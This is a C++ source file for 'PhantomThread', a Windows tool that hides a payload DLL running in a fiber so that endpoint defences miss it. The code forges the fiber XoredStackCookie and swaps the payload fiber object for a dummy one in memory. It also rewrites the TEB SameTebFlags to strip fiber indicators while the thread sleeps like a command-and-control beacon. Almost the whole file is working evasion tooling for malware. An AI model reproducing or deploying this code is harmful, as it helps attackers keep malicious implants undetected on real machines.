#include "PhantomThread.h"

void ErrorExit(LPTSTR lpszFunction)
{
    // Retrieve the system error message for the last-error code

    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError();

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf,
        0, NULL);

    // Display the error message and exit the process

    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
        (lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
    StringCchPrintf((LPTSTR)lpDisplayBuf,
        LocalSize(lpDisplayBuf) / sizeof(TCHAR),
        TEXT("%s failed with error %d: %s"),
        lpszFunction, dw, lpMsgBuf);
    MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
    ExitProcess(dw);
}

PTEB getTeb()
{
#if defined(_M_X64) // x64
    PTEB tebPtr = (PTEB)__readgsqword(offsetof(NT_TIB, Self));
#else // x86
    PTEB tebPtr = (PTEB)__readfsdword(offsetof(NT_TIB, Self));
#endif
    return tebPtr;
}


/*
* Returns a forged XoredStack Cookie value
* This will work if when overwriting a Fiber object with a Dummy object we wish to switch Execution to it & we don't want to raise an exception.
* It passes the validation check inside SwitchToFiber()
*/
uint64_t GenerateXoredStackCookie(PVOID dummyFiberAddr, Fiber& dummyFiberObj, PVOID secondaryFiberAddr)
{
    uint64_t fiberObject = 0;
    uint64_t stackBase = 0;
    uint64_t xoredCookie = 0;
    uint64_t basepFiberCookie = 0;
    uint64_t forgedXoredStackCookie = 0;
    uint64_t tmp1, tmp2;

    printf("\t[+] Generating forged XoredStackCookie to use when overwriting secondaryFiber HEAP block with Dummy Fiber\n");

    /* 
    * Calculate BasepFiberCookie (The randomly generated value per THREAD value)
    * See CreatFiberEx!KernelBase.dll for XoredCookie being set in Fiber object
    * Merely reverse this process (simultaneous equations) to get BasepFiberCookie value.
    */
    stackBase = (uint64_t)dummyFiberObj.StackBase;
    xoredCookie = dummyFiberObj.XoredCookie;
    fiberObject = (uint64_t)dummyFiberAddr;

    tmp1 = xoredCookie ^ stackBase;
    basepFiberCookie = tmp1 ^ fiberObject;
    printf("\t[+] Calculated basepFiberCookie value: 0x%llx\n", basepFiberCookie);

    // Using basepFiberCookie, generate a new XoredStack Cookie based on the fiberData location we wish to overwrite.
    tmp2 = basepFiberCookie ^ stackBase;
    forgedXoredStackCookie = (uint64_t)secondaryFiberAddr ^ tmp2;
    printf("\t[+] Calculated Forged XoredStackCookie value: %llx\n", forgedXoredStackCookie);

    return forgedXoredStackCookie;
}

void writeSameTebFlags(PTEB pTeb, USHORT newValue)
{
    //NOTE: Can we not do this directly with compiler intrinsics? Rather than calling APIs that could be hooked.
    uint64_t nBytesWritten = 0;
    uint64_t pSameTebFlags = (uint64_t)pTeb + 0x17EE;
    USHORT original_SameTebFlags; // hasFiberData = 0x0004;

    // Read existing SameTebFlags so we can replace them after sleep
    if (!ReadProcessMemory(GetCurrentProcess(), (LPCVOID)pSameTebFlags, &original_SameTebFlags, sizeof(USHORT), &nBytesWritten))
    {
        ErrorExit((LPTSTR)L"ReadProcessMemory");
    }
    printf("\t[!] Old SameTebFlags value: 0x%x\n", original_SameTebFlags);

    printf("\t[!] Writing new SameTebFlags field: 0x%x\n", newValue);
    if (!WriteProcessMemory(GetCurrentProcess(), (LPVOID)pSameTebFlags, &newValue, sizeof(USHORT), &nBytesWritten))
    {
        ErrorExit((LPTSTR)L"WriteProcessMemory");
    }

}

void dummyFiberFunc(bool setup)
{
    while (true)
    {
        /*
        * Dummy fiber immediately continues execution of primary Fiber
        * Depending on use case this could be adapted.
        */
        SwitchToFiber(primaryFiber);
    }
}

void scheduleFibers()
{
    // Create fiber object containers
    Fiber dummyFiberObject = {};
    Fiber secondaryFiberObject = {};

    bool runPayloadFiber = true;

    // Location of TEB in memory for our main thread.
    PTEB pTeb = getTeb();
    printf("[+] pTeb == 0%llx\n", (uint64_t)pTeb);
    printf("[+] Operating as: Thread\n");

    // Convert current Thread to a Fiber
    primaryFiber = ConvertThreadToFiber(NULL); 
    printf("[+] Convert Thread to primary Fiber\n");

    /* 
    * Create second fiber that executes PayloadFunc 
    * This takes an argument of the fiber to return to after it has finished executing.
    * Then save secondaryFiber object
    */
    secondaryFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)(void*)PayloadFunc, primaryFiber);
    memcpy(&secondaryFiberObject, secondaryFiber, sizeof(Fiber));

    /* 
    * Create dummyFiber 
    * Switch to it to populate fields
    * Copy to a Fiber object
    */
    dummyFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)(void*)dummyFiberFunc, 0);
    SwitchToFiber(dummyFiber);
    memcpy(&dummyFiberObject, dummyFiber, sizeof(Fiber));

    /*
    * Modify XoredCookie to be valid for dummy Fiber
    * This allows use to Execute the dummy fiber if we choose not to unmask the secondaryFiber
    * If we don't intend to run the dummy fiber in place of secondary Fiber at any point then we can omit this step
    * For instance perhaps we want to run our evil secondary fiber once and don't want to call DeleteFiber() 
    */
    dummyFiberObject.XoredCookie = GenerateXoredStackCookie(dummyFiber, dummyFiberObject, secondaryFiber);
    // Mask payload fiber object in memory with spare Fiber object.
    printf("\t[+] Mask Dormant (Payload) Fiber with Dummy Fiber Object\n");
    memcpy(secondaryFiber, &dummyFiberObject, sizeof(Fiber));

    int counter = 0;
    while (counter < 10) {

        // Change SameTebFlags field to remove HAS_FIBER_DATA flag indicator & thus detection artifact.
        printf("\t[+] Removing SameTebFlags Fiber indicator prior to sleeping\n");
        writeSameTebFlags(pTeb, INITIAL_THREAD);

        // Sleep i.e. like a beacon would waiting for something / or some instruction.
        printf("\t[+] Sleeping 10 seconds as masked PhantomThread\n");
        Sleep(10000);

        /* 
        * Restore HAS_FIBER_DATA mask to SameTebFlags before switching to it.
        * This is only necessary if one intends to use to following API calls after this point:
        * ConvertThreadToFiber/Ex
        * ConvertFiberToThread
        * DeleteFiber
        * IsThreadAFiber
        */
        printf("\t[+] Restoring SameTebFlags Fiber indicator before switching Fibers\n");
        writeSameTebFlags(pTeb, HAS_FIBER_DATA);
        
        if (runPayloadFiber) {
            /* 
            * Restore evil fiber object before switching to it.
            * If we don't restore then our [CLEAN] masked fiber will continue to run.
            */
            printf("\t[+] Unmask Dormant (Dummy) Fiber with Payload Fiber Object\n");
            memcpy(secondaryFiber, &secondaryFiberObject, sizeof(Fiber));
            runPayloadFiber = runPayloadMultipleTimes;
        }

        // Switch to Dormant fiber
        printf("\t[+] Switching to Dormant Fiber\n");
        SwitchToFiber(secondaryFiber);
        printf("[+] Executing as Primary Fiber\n");

        // Save Fiber object after it has run, since it has been updated.
        memcpy(&secondaryFiberObject, secondaryFiber, sizeof(Fiber));

        // Mask payload fiber object in memory with spare Fiber object, if not already masked.
        printf("\t[+] Mask Dormant Fiber with Dummy Fiber Object if not already masked\n");
        memcpy(secondaryFiber, &dummyFiberObject, sizeof(Fiber));

        // Execution continues immediately where it left off, after the call the SwitchToFiber() hence we put it into a loop.
        counter++;
    }

}

void LoadPayloadDll()
{
    hModule = LoadLibraryA("PhantomThreadPayload.dll");

    if (hModule != NULL)
    {
        PayloadFunc = (PAYLOAD_FUNC)GetProcAddress(hModule, "PayloadFunc");
        if (PayloadFunc == NULL)
        {
            printf("[!] Unable to get payload export 'PayloadFunc'\n");
        }
    }
    else
    {
        printf("[!] Unable to Load PhantomThreadPayload.dll\n");
    }
}

void PrintHelp(char* name)
{
    printf("Usage:%s [x|c] \n\n", name);
    printf("x : Run Payload Fiber once & switch permanently to Dummy Fiber after (in this case a copy of the Primary Fiber)\n");
    printf("c : Continuously switch back and forth between Primary Fiber & Payload Fiber\n\n");
}

int main(int argc, char**argv)
{

    printf(R"EOF(
__________.__                   __                   ___________.__                              .___
\______   \  |__ _____    _____/  |_  ____   _____   \__    ___/|  |_________   ____ _____     __| _/
 |     ___/  |  \\__  \  /    \   __\/  _ \ /     \    |    |   |  |  \_  __ \_/ __ \\__  \   / __ | 
 |    |   |   Y  \/ __ \|   |  \  | (  <_> )  Y Y  \   |    |   |   Y  \  | \/\  ___/ / __ \_/ /_/ | 
 |____|   |___|  (____  /___|  /__|  \____/|__|_|  /   |____|   |___|  /__|    \___  >____  /\____ | 
               \/     \/     \/                  \/                  \/            \/     \/      \/ )EOF");
    printf("\n\n");

    if (argc < 2)
    {
        PrintHelp(argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "x") == 0)
    {
        runPayloadMultipleTimes = false;
    }
    else if(strcmp(argv[1], "c") == 0)
    {
        runPayloadMultipleTimes = true;
    }

    /* 
    * Load export from PhantomThreadPayload.dll
    * In reality we would reflectively load the DLL instead of using LoadLibrary, GetProcAddress
    */
    LoadPayloadDll();
 
    /* Required critieria :
    * 
        Primary fiber [When sleeping like with a beacon] should have:
            1. No sign of using Fibers in callstack i.e. Fiber related functions.
            2. No sign of using Fibers in TEB. E.g. SameTebFlags field set to 0.

        Secondary fiber [bad call-stack that performs malicious actions] can have anything since it only executes at one moment and only susceptible to detection via in-line callstack collection.

     */
    DWORD tid = 0;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)scheduleFibers, 0, 0, &tid);
    WaitForSingleObject(hThread, INFINITE); 

    // Free payload module
    FreeLibrary(hModule);

    return 0;
}